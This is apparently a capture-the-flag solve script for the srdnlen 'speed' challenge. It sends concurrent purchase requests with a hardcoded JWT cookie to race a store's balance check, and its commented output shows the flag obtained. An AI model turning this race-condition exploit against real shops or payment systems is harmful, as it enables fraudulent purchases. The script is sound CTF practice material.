import asyncio
import aiohttp
import time

payloads = [
    {"productId": 1},
    {"productId": 4},
]

headers = {
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Origin": "http://speed.challs.srdnlen.it:8082",
    "Referer": "http://speed.challs.srdnlen.it:8082/store",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhjMDdiYjU3ODllMWUzZTc0MDlmZjUiLCJpYXQiOjE3MzczMDQyMDcsImV4cCI6MTczNzM0MDIwN30.1T9et3TdFtaGPMnACDDkaHAMc2VaE2RTQJ6yBurWixg",
    "Connection": "keep-alive",
}

url = "http://speed.challs.srdnlen.it:8082/store"

async def post_request(session, payload):
    """Send a single POST request."""
    try:
        async with session.post(url, headers=headers, json=payload) as response:
            response_text = await response.text()
            print(f"Response for productId {payload['productId']}: {response_text}")
    except Exception as e:
        print(f"Error with productId {payload['productId']}: {e}")

async def main():
    """Send all requests concurrently with minimal overhead."""
    connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*(post_request(session, payload) for payload in payloads))

start_time = time.time()
asyncio.run(main())
end_time = time.time()

print(f"Completed in {end_time - start_time:.2f} seconds.")


# └─[$] <> python3 solve.py
# Response for productId 4: {"success":false,"message":"Insufficient balance to purchase this product."}
# Response for productId 1: {"success":true,"message":"Product correctly bought! Remaining balance: 0","product":{"Name":"Lightning McQueen's Secret Text","Description":"Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.","FLAG":"srdnlen{6peed_1s_My_0nly_Competition}"}}
# Completed in 0.76 seconds.